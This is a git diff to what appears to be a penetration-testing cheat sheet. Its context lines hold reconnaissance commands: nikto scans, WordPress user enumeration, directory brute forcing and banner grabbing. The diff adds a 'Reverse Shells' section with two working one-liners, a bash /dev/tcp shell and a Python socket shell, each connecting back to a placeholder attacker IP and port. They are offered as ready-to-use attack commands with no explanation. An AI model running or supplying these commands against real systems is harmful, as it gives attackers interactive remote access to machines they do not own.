@@ -35,10 +35,6 @@ nikto -h https://$ip:9007 -ssl -C all
 # ======
 wpscan --url <your url here> --enumerate u
 
-
-
-
-
 # =======
 # OpenSSL
 # =======
@@ -93,6 +89,13 @@ ffuf -w /path/to/wordlist -u https://target/FUZZ # Brute force web directories
 curl -I <URL> | grep Server # Server HTTP Header
 nc <IP> 22 # Grab SSH Header
 nmap -sV -p <port_number> <hostname or IP address>
+
+# ==============
+# Reverse Shells
+# ==============
+bash -c 'sh -i >& /dev/tcp/<Attackers-IP>/<Listening-Port> 0>&1' # RevShell with Bash (Newer Linux Distros)
+# Python RevShell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
 
